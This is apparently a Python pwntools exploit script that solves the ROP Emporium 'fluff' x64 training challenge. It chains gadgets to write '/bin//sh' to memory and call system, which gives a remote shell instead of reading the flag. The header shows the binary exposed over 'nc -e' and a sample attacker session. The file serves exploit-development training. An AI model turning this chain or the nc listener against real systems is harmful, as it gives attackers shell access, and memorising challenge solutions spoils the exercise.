#!/usr/bin/python3
##########################################################################
#   Title:          ROP Emporium "fluff" x64 exploit Remote Shell exploit
#   Author:         fckoo
#   Description:    This is an exploit for ROP Emporium's "fluff" x64 bit
#                   exploit challenge.  Instead of using the ROP chain to
#                   /bin/cat the flag.txt, I used it to obtain a remote
#                   shell on the system.
##########################################################################
#                       Victim
#   victim$ nc -lvp 5432 -e ./fluff
##########################################################################
#                       ATTACKER
#   attacker$ python3 ./fluff_exploit_rce.py --host 127.0.0.1 --port 5432
# [+] Opening connection to 127.0.0.1 on port 5432: Done
# [*] Switching to interactive mode
# $ ls
# flag.txt
# fluff
# $ cat ./flag.txt
# ROPE{a_placeholder_32byte_flag!}
# $
##########################################################################
from pwn import *
import argparse

def rop():
	POP_R12_MOV_R13D_CONST_RET = 0x0000000000400832
	XOR_R11_R11_POP_R14_MOV_EDI_CONST_RET = 0x0000000000400822
	XOR_R11_R12_POP_R12_MOV_R13D_CONST_RET = 0x000000000040082f
	MOV_QWORDPTR_R10_R11_POP_R13_POP_R12_XOR_BYTEPTR_R10_R12B_RET = 0x000000000040084e
	XCHG_R11_R10_POP_R15_MOV_R11D_CONST_RET = 0x0000000000400840
	BUF = 0x601050
	POP_RDI_RET = 0x00000000004008c3
	CALL_SYSTEM  = 0x0000000000400810

	# Clear r11
	r  = b""
	r += p64(XOR_R11_R11_POP_R14_MOV_EDI_CONST_RET)
	r += p64(0xcafebabe)	# PAD

	# Set R12 to BUF
	r += p64(POP_R12_MOV_R13D_CONST_RET)
	r += p64(BUF)		# R12

	# Set R11 to R12 (BUF)
	r += p64(XOR_R11_R12_POP_R12_MOV_R13D_CONST_RET)
	r += p64(0xcafebabe)

	# Set R10 to R11
	r += p64(XCHG_R11_R10_POP_R15_MOV_R11D_CONST_RET)
	r += p64(0xcafebabe)

	# Clear r11
	r += p64(XOR_R11_R11_POP_R14_MOV_EDI_CONST_RET)
	r += p64(0xcafebabe)	# PAD

	# Set R12 to 0x91bin/sh
	r += p64(POP_R12_MOV_R13D_CONST_RET)
	r += b"\x91bin//sh"	# 0x91 cause it gets XORED at last step before SHELL with 0xbe (from our 0xcafebabe)

	# Set R11 to R12 (0x91bin/sh)
	r += p64(XOR_R11_R12_POP_R12_MOV_R13D_CONST_RET)
	r += p64(0xcafebabe)	# PAD

	# Move /bin//sh to BUF (the begining / get's XOR'd to what we want
	r += p64(MOV_QWORDPTR_R10_R11_POP_R13_POP_R12_XOR_BYTEPTR_R10_R12B_RET)
	r += p64(0xcafebabe)
	r += p64(0xcafebabe)

	# Get a SHELL
	r += p64(POP_RDI_RET)
	r += p64(BUF)
	r += p64(CALL_SYSTEM)

	return r

def exploit(target_ip, target_port):
	VULN = "./fluff"

	OFFSET = 40
	payload  = b""
	payload += b"A" * OFFSET
	payload += rop()

	if target_ip is None:
		p = process(VULN)
		p.clean()
		p.sendline(payload)
		p.interactive()
	else:
		conn = remote(target_ip, target_port)
		conn.clean()
		conn.sendline(payload)
		conn.interactive()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Exploit for ROPEmporium\'s fluff (64-bit) by fckoo')
	parser.add_argument('--host', metavar='host', type=str, help='Target host IP, not supplied it will run ./fluff on local dir')
	parser.add_argument('--port', metavar='port', type=int, help='Target port')
	args = parser.parse_args()
	exploit(args.host, args.port)
